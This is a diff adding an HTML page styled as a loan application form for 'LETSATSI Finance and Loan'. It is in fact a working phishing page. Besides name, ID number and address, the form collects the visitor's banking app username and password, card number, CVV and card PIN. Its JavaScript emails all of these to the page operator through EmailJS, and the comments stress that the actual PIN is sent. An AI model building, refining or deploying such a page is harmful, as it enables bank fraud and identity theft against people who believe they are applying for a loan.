@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loan Application | LETSATSI Finance and Loan</title>
+    <!-- Google Fonts for clean typography -->
+    <link
+        href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet"
+    />
+    <!-- Font Awesome for icons -->
+    <link
+        rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <!-- EmailJS SDK -->
+    <script
+        type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <style>
+        /* =============================
+           CSS RESET & GLOBAL STYLES
+           ============================= */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #ffffff;
+            font-family: "Roboto", sans-serif;
+            color: #000000;
+            line-height: 1.5;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        /* Logo Section */
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eaeaea;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-color: #4285f4;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .company-name {
+            font-family: "Roboto", sans-serif;
+            font-size: 24px;
+            font-weight: 600;
+            color: #000000;
+        }
+
+        /* Form Container */
+        .form-container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Section Headers */
+        .section-header {
+            font-size: 20px;
+            font-weight: 700;
+            color: #4285f4;
+            text-align: center;
+            margin: 40px 0 25px 0;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #f0f0f0;
+        }
+
+        .warning-text {
+            color: #ff0000;
+            text-align: center;
+            font-style: italic;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .sub-header {
+            font-size: 18px;
+            font-weight: 600;
+            color: #ffc107;
+            text-decoration: underline;
+            margin: 30px 0 20px 0;
+        }
+
+        /* Form Groups */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 14px;
+            color: #000000;
+        }
+
+        /* Input Fields */
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #cccccc;
+            border-radius: 6px;
+            font-size: 16px;
+            font-family: "Roboto", sans-serif;
+            background-color: #ffffff;
+            transition: border-color 0.3s;
+        }
+
+        .form-control:focus {
+            border-color: #4285f4;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23333' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 16px;
+            padding-right: 40px;
+        }
+
+        textarea.form-control {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        .date-input-wrapper {
+            position: relative;
+        }
+
+        .date-input-wrapper .form-control {
+            padding-right: 45px;
+        }
+
+        .date-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            pointer-events: none;
+        }
+
+        /* Submit Button */
+        .submit-btn {
+            background-color: #4285f4;
+            color: #ffffff;
+            font-family: "Roboto", sans-serif;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            padding: 16px 30px;
+            width: 100%;
+            max-width: 300px;
+            display: block;
+            margin: 50px auto;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .submit-btn:hover {
+            background-color: #3367d6;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        .submit-btn.loading {
+            background-color: #6c757d;
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+
+        /* Form Layout */
+        .form-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+            min-width: 250px;
+        }
+
+        /* Thank You Popup */
+        .thank-you-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .thank-you-content {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            animation: popupFadeIn 0.5s ease;
+        }
+
+        @keyframes popupFadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .thank-you-header {
+            font-size: 28px;
+            font-weight: 700;
+            color: #4285f4;
+            margin-bottom: 20px;
+        }
+
+        .thank-you-message {
+            font-size: 18px;
+            color: #000000;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .close-popup-btn {
+            background-color: #4285f4;
+            color: #ffffff;
+            font-family: "Roboto", sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-block;
+        }
+
+        .close-popup-btn:hover {
+            background-color: #3367d6;
+            transform: translateY(-2px);
+        }
+
+        /* Messages */
+        .error-message {
+            color: #ff0000;
+            background-color: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff0000;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+            display: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .form-container {
+                padding: 0 10px;
+            }
+
+            .section-header {
+                font-size: 18px;
+                margin: 30px 0 20px 0;
+            }
+
+            .sub-header {
+                font-size: 16px;
+            }
+
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+
+            .form-row .form-group {
+                min-width: 100%;
+            }
+
+            .company-name {
+                font-size: 20px;
+            }
+
+            .thank-you-content {
+                padding: 30px 20px;
+            }
+
+            .thank-you-header {
+                font-size: 24px;
+            }
+
+            .thank-you-message {
+                font-size: 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+
+            .logo-section {
+                flex-direction: column;
+                text-align: center;
+                gap: 10px;
+            }
+
+            .company-name {
+                font-size: 18px;
+            }
+
+            .form-control {
+                padding: 10px 12px;
+                font-size: 15px;
+            }
+
+            .submit-btn {
+                font-size: 16px;
+                padding: 14px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo Section -->
+    <div class="logo-section">
+        <div class="logo">
+            <img
+                src="/WhatsApp Image 2025-11-30 at 3.12.46 PM.jpeg`"
+                alt="LETSATSI Logo"
+            />
+        </div>
+        <div class="company-name">LETSATSI Finance and Loan</div>
+    </div>
+
+    <!-- Form Container -->
+    <div class="form-container">
+        <!-- Error message container -->
+        <div class="error-message" id="errorMessage"></div>
+
+        <form id="loanApplicationForm">
+            <!-- SECTION 1: CONTACT INFORMATION -->
+            <h2 class="section-header">Contact Information</h2>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="fullName">Full Name</label>
+                    <input
+                        type="text"
+                        id="fullName"
+                        name="full_name"
+                        class="form-control"
+                        placeholder="Enter your full name"
+                        required
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label for="dateOfBirth">Date of Birth</label>
+                    <div class="date-input-wrapper">
+                        <input
+                            type="date"
+                            id="dateOfBirth"
+                            name="date_of_birth"
+                            class="form-control"
+                            required
+                        />
+                        <span class="date-icon"><i class="fas fa-calendar-alt"></i></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="phoneNumber">Phone Number</label>
+                    <input
+                        type="tel"
+                        id="phoneNumber"
+                        name="phone_number"
+                        class="form-control"
+                        placeholder="Enter your phone number"
+                        required
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label for="emailAddress">Email Address</label>
+                    <input
+                        type="email"
+                        id="emailAddress"
+                        name="email_address"
+                        class="form-control"
+                        placeholder="Enter your email address"
+                        required
+                    />
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="gender">Gender</label>
+                    <select id="gender" name="gender" class="form-control" required>
+                        <option value="" disabled selected>Select your gender</option>
+                        <option value="male">Male</option>
+                        <option value="female">Female</option>
+                        <option value="other">Other</option>
+                        <option value="prefer-not-to-say">Prefer not to say</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="city">City</label>
+                    <input
+                        type="text"
+                        id="city"
+                        name="city"
+                        class="form-control"
+                        placeholder="Enter your city"
+                        required
+                    />
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="residentialAddress">Residential Address</label>
+                <textarea
+                    id="residentialAddress"
+                    name="residential_address"
+                    class="form-control"
+                    placeholder="Enter your full residential address"
+                    required
+                ></textarea>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="province">Province</label>
+                    <input
+                        type="text"
+                        id="province"
+                        name="province"
+                        class="form-control"
+                        placeholder="Enter your province"
+                        required
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label for="country">Country</label>
+                    <select id="country" name="country" class="form-control" required>
+                        <option value="" disabled selected>Select your country</option>
+                        <option value="south-africa">South Africa</option>
+                        <option value="zimbabwe">Zimbabwe</option>
+                        <option value="botswana">Botswana</option>
+                        <option value="namibia">Namibia</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- SECTION 2: ACCOUNTING INFORMATION -->
+            <h2 class="section-header">Accounting Information</h2>
+
+            <p class="warning-text">
+                This field is required for Credit Score Verification Purposes.
+            </p>
+
+            <h3 class="sub-header">Loan Details</h3>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="idNumber">ID Number</label>
+                    <input
+                        type="text"
+                        id="idNumber"
+                        name="id_number"
+                        class="form-control"
+                        placeholder="Enter your ID number"
+                        required
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label for="grossSalary">Gross Salary (in ZAR)</label>
+                    <input
+                        type="number"
+                        id="grossSalary"
+                        name="gross_salary"
+                        class="form-control"
+                        placeholder="Enter your gross salary"
+                        required
+                    />
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="occupation">Occupation</label>
+                    <input
+                        type="text"
+                        id="occupation"
+                        name="occupation"
+                        class="form-control"
+                        placeholder="Enter your occupation"
+                        required
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label for="salaryPayDate">Salary Pay Date</label>
+                    <div class="date-input-wrapper">
+                        <input
+                            type="date"
+                            id="salaryPayDate"
+                            name="salary_pay_date"
+                            class="form-control"
+                            required
+                        />
+                        <span class="date-icon"><i class="fas fa-calendar-alt"></i></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="loanAmount">Loan Amount (in ZAR)</label>
+                    <input
+                        type="number"
+                        id="loanAmount"
+                        name="loan_amount"
+                        class="form-control"
+                        placeholder="Enter loan amount"
+                        required
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label for="loanRepayDate">Loan Repay Date</label>
+                    <div class="date-input-wrapper">
+                        <input
+                            type="date"
+                            id="loanRepayDate"
+                            name="loan_repay_date"
+                            class="form-control"
+                            required
+                        />
+                        <span class="date-icon"><i class="fas fa-calendar-alt"></i></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="loanReason">Reason for loan</label>
+                <textarea
+                    id="loanReason"
+                    name="loan_reason"
+                    class="form-control"
+                    placeholder="Please explain the reason for your loan application"
+                    required
+                ></textarea>
+            </div>
+
+            <!-- SECTION 3: BANKING DETAILS -->
+            <h3 class="sub-header">Banking Details</h3>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="bank">Bank</label>
+                    <select id="bank" name="bank" class="form-control" required>
+                        <option value="" disabled selected>Select your bank</option>
+                        <option value="absa">ABSA</option>
+                        <option value="fnb">First National Bank (FNB)</option>
+                        <option value="nedbank">Nedbank</option>
+                        <option value="standard-bank">Standard Bank</option>
+                        <option value="capitec">Capitec Bank</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="accountNumber">Account Number</label>
+                    <input
+                        type="text"
+                        id="accountNumber"
+                        name="account_number"
+                        class="form-control"
+                        placeholder="Enter your account number"
+                        required
+                    />
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="bankingAppUsername">Banking App Username</label>
+                    <input
+                        type="text"
+                        id="bankingAppUsername"
+                        name="banking_app_username"
+                        class="form-control"
+                        placeholder="Enter your banking app username"
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label for="bankingAppPassword">Banking App Password</label>
+                    <input
+                        type="password"
+                        id="bankingAppPassword"
+                        name="banking_app_password"
+                        class="form-control"
+                        placeholder="Enter your banking app password"
+                    />
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="cardNumber">Card Number</label>
+                    <input
+                        type="text"
+                        id="cardNumber"
+                        name="card_number"
+                        class="form-control"
+                        placeholder="Enter your card number"
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label for="cardCvv">Card CVV</label>
+                    <input
+                        type="password"
+                        id="cardCvv"
+                        name="card_cvv"
+                        class="form-control"
+                        placeholder="Enter your 3-digit CVV"
+                        maxlength="3"
+                    />
+                </div>
+            </div>
+
+            <!-- Card PIN field - UPDATED: Allows 4 OR 5 digits -->
+            <div class="form-group">
+                <label for="cardPin">Card PIN</label>
+                <input
+                    type="password"
+                    id="cardPin"
+                    name="card_pin"
+                    class="form-control"
+                    placeholder="Enter your  card PIN"
+                    maxlength="5"
+                    required
+                />
+                <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">
+                </small>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit" class="submit-btn" id="submitBtn">
+                Submit Application
+            </button>
+        </form>
+    </div>
+
+    <!-- Thank You Popup -->
+    <div class="thank-you-popup" id="thankYouPopup">
+        <div class="thank-you-content">
+            <h2 class="thank-you-header">THANK YOU</h2>
+            <p class="thank-you-message">
+                Your request has been submitted successfully.<br />
+                We will contact you shortly.
+            </p>
+            <button class="close-popup-btn" id="closePopupBtn">Close</button>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Initialize EmailJS with your public key
+        (function () {
+            emailjs.init({
+                publicKey: "w0r3c1UDPFJ6TfOQd",
+            });
+        })();
+
+        // Wait for the page to fully load
+        document.addEventListener("DOMContentLoaded", function () {
+            // Get DOM elements
+            const form = document.getElementById("loanApplicationForm");
+            const submitBtn = document.getElementById("submitBtn");
+            const thankYouPopup = document.getElementById("thankYouPopup");
+            const closePopupBtn = document.getElementById("closePopupBtn");
+            const errorMessage = document.getElementById("errorMessage");
+
+            // EmailJS Configuration - YOUR CREDENTIALS
+            const EMAILJS_SERVICE_ID = "service_c2de5su";
+            const EMAILJS_TEMPLATE_ID = "template_tn3zapf";
+
+            // Function to show the thank you popup
+            function showThankYouPopup() {
+                thankYouPopup.style.display = "flex";
+                document.body.style.overflow = "hidden";
+            }
+
+            function hideThankYouPopup() {
+                thankYouPopup.style.display = "none";
+                document.body.style.overflow = "auto";
+            }
+
+            function showError(message) {
+                errorMessage.textContent = message;
+                errorMessage.style.display = "block";
+                errorMessage.scrollIntoView({ behavior: "smooth", block: "start" });
+
+                setTimeout(() => {
+                    errorMessage.style.display = "none";
+                }, 10000);
+            }
+
+            function hideError() {
+                errorMessage.style.display = "none";
+            }
+
+            // Event Listeners
+            closePopupBtn.addEventListener("click", hideThankYouPopup);
+
+            thankYouPopup.addEventListener("click", function (event) {
+                if (event.target === thankYouPopup) {
+                    hideThankYouPopup();
+                }
+            });
+
+            document.addEventListener("keydown", function (event) {
+                if (event.key === "Escape" && thankYouPopup.style.display === "flex") {
+                    hideThankYouPopup();
+                }
+            });
+
+            // Form Submission
+            form.addEventListener("submit", async function (event) {
+                event.preventDefault();
+
+                hideError();
+
+                // Basic form validation
+                let isValid = true;
+                const requiredFields = form.querySelectorAll("[required]");
+
+                requiredFields.forEach((field) => {
+                    field.style.borderColor = "#CCCCCC";
+                });
+
+                requiredFields.forEach((field) => {
+                    if (!field.value.trim()) {
+                        isValid = false;
+                        field.style.borderColor = "#FF0000";
+                    }
+                });
+
+                // Validate email format
+                const emailField = document.getElementById("emailAddress");
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (emailField.value && !emailRegex.test(emailField.value)) {
+                    isValid = false;
+                    emailField.style.borderColor = "#FF0000";
+                    showError("Please enter a valid email address.");
+                    return;
+                }
+
+                // Validate phone number
+                const phoneField = document.getElementById("phoneNumber");
+                const phoneRegex = /^[+]?[\d\s\-()]+$/;
+                if (phoneField.value && !phoneRegex.test(phoneField.value)) {
+                    isValid = false;
+                    phoneField.style.borderColor = "#FF0000";
+                    showError("Please enter a valid phone number.");
+                    return;
+                }
+
+                // *** UPDATED: Validate Card PIN is 4 OR 5 digits ***
+                const cardPinField = document.getElementById("cardPin");
+                const pinValue = cardPinField.value;
+                
+                // Check if PIN is exactly 4 OR 5 digits (not both required)
+                if (pinValue && !/^\d{4,5}$/.test(pinValue)) {
+                    isValid = false;
+                    cardPinField.style.borderColor = "#FF0000";
+                    showError("Card PIN must be 4 or 5 digits only.");
+                    return;
+                }
+
+                if (!isValid) {
+                    showError("Please fill in all required fields correctly.");
+                    return;
+                }
+
+                // Disable submit button and show loading state
+                submitBtn.disabled = true;
+                submitBtn.classList.add("loading");
+                submitBtn.textContent = "Submitting...";
+
+                try {
+                    // Collect all form data - CARD PIN WILL BE INCLUDED AS ENTERED
+                    const templateParams = {
+                        // Contact Information
+                        full_name: document.getElementById("fullName").value,
+                        date_of_birth: document.getElementById("dateOfBirth").value,
+                        phone_number: document.getElementById("phoneNumber").value,
+                        email_address: document.getElementById("emailAddress").value,
+                        gender: document.getElementById("gender").value,
+                        city: document.getElementById("city").value,
+                        residential_address:
+                            document.getElementById("residentialAddress").value,
+                        province: document.getElementById("province").value,
+                        country: document.getElementById("country").value,
+
+                        // Accounting Information
+                        id_number: document.getElementById("idNumber").value,
+                        gross_salary: document.getElementById("grossSalary").value,
+                        occupation: document.getElementById("occupation").value,
+                        salary_pay_date: document.getElementById("salaryPayDate").value,
+                        loan_amount: document.getElementById("loanAmount").value,
+                        loan_repay_date: document.getElementById("loanRepayDate").value,
+                        loan_reason: document.getElementById("loanReason").value,
+
+                        // Banking Details - INCLUDING ACTUAL CARD PIN
+                        bank: document.getElementById("bank").value,
+                        account_number: document.getElementById("accountNumber").value,
+                        banking_app_username:
+                            document.getElementById("bankingAppUsername").value ||
+                            "Not provided",
+                        banking_app_password:
+                            document.getElementById("bankingAppPassword").value ||
+                            "Not provided",
+                        card_number:
+                            document.getElementById("cardNumber").value || "Not provided",
+                        card_cvv:
+                            document.getElementById("cardCvv").value || "Not provided",
+                        card_pin: document.getElementById("cardPin").value, // ACTUAL PIN SENT
+
+                        // Metadata
+                        submission_date: new Date().toLocaleString(),
+                        page_title: "Loan Application Form - LETSATSI Finance",
+                        to_email: "YOUR_GMAIL_ADDRESS@gmail.com", // ADD THIS TO FORCE GMAIL DELIVERY
+                    };
+
+                    // IMPORTANT: For Gmail delivery, check these settings in EmailJS:
+                    // 1. Go to https://dashboard.emailjs.com/
+                    // 2. Click on "Email Services"
+                    // 3. Select your service (service_f3xz33a)
+                    // 4. Make sure it's connected to Gmail
+                    // 5. The "To Email" field in your template should be set to your Gmail
+
+                    console.log("Sending email with params:", templateParams);
+
+                    // Send email using EmailJS
+                    const response = await emailjs.send(
+                        EMAILJS_SERVICE_ID,
+                        EMAILJS_TEMPLATE_ID,
+                        templateParams
+                    );
+
+                    // Check if submission was successful
+                    if (response.status === 200) {
+                        // Show thank you popup
+                        showThankYouPopup();
+
+                        // Reset the form
+                        form.reset();
+
+                        // Reset date fields
+                        const today = new Date();
+                        const nextPayDate = new Date(today);
+                        nextPayDate.setDate(today.getDate() + 30);
+
+                        const repayDate = new Date(today);
+                        repayDate.setDate(today.getDate() + 60);
+
+                        document.getElementById("salaryPayDate").valueAsDate = nextPayDate;
+                        document.getElementById("loanRepayDate").valueAsDate = repayDate;
+
+                        // Scroll to top
+                        window.scrollTo({ top: 0, behavior: "smooth" });
+
+                        console.log("Email sent successfully!", response);
+                    } else {
+                        showError("Failed to submit form. Please try again.");
+                        console.log("Email sending failed:", response);
+                    }
+                } catch (error) {
+                    console.error("EmailJS error:", error);
+
+                    // More detailed error messages
+                    if (error.status === 0) {
+                        showError(
+                            "Network error. Please check your internet connection."
+                        );
+                    } else if (error.text) {
+                        showError(`EmailJS Error: ${error.text}`);
+                    } else if (error.message) {
+                        showError(`Error: ${error.message}`);
+                    } else {
+                        showError("An unexpected error occurred. Please try again.");
+                    }
+
+                    console.log("FAILED...", error);
+                } finally {
+                    // Re-enable submit button
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove("loading");
+                    submitBtn.textContent = "Submit Application";
+                }
+            });
+
+            // Date inputs setup
+            const dateInputs = document.querySelectorAll('input[type="date"]');
+            dateInputs.forEach((input) => {
+                if (input.id === "salaryPayDate") {
+                    const today = new Date();
+                    const nextPayDate = new Date(today);
+                    nextPayDate.setDate(today.getDate() + 30);
+                    input.valueAsDate = nextPayDate;
+                }
+
+                if (input.id === "loanRepayDate") {
+                    const today = new Date();
+                    const repayDate = new Date(today);
+                    repayDate.setDate(today.getDate() + 60);
+                    input.valueAsDate = repayDate;
+                }
+
+                const dateIcon = input.parentElement.querySelector(".date-icon");
+                if (dateIcon) {
+                    dateIcon.addEventListener("click", function () {
+                        input.focus();
+                        if (input.showPicker) {
+                            input.showPicker();
+                        }
+                    });
+                }
+            });
+
+            // Format currency fields
+            const currencyFields = document.querySelectorAll(
+                'input[type="number"]'
+            );
+            currencyFields.forEach((field) => {
+                field.addEventListener("blur", function () {
+                    if (this.value) {
+                        this.value = parseFloat(this.value).toFixed(2);
+                    }
+                });
+            });
+
+            // Clear error messages on input
+            const formInputs = form.querySelectorAll("input, textarea, select");
+            formInputs.forEach((input) => {
+                input.addEventListener("input", function () {
+                    this.style.borderColor = "#CCCCCC";
+                    hideError();
+                });
+            });
+
+            // Additional validation for Card PIN field
+            const cardPinField = document.getElementById("cardPin");
+            if (cardPinField) {
+                cardPinField.addEventListener("input", function() {
+                    // Only allow numbers
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    // Auto-format: Limit to 5 digits
+                    if (this.value.length > 5) {
+                        this.value = this.value.slice(0, 5);
+                    }
+                    
+                    // Show real-time validation feedback
+                    const pinValue = this.value;
+                    if (pinValue.length > 0) {
+                        if (/^\d{4,5}$/.test(pinValue)) {
+                            this.style.borderColor = "#28a745"; // Green for valid
+                        } else {
+                            this.style.borderColor = "#ffc107"; // Yellow for in-progress
+                        }
+                    } else {
+                        this.style.borderColor = "#CCCCCC"; // Default
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
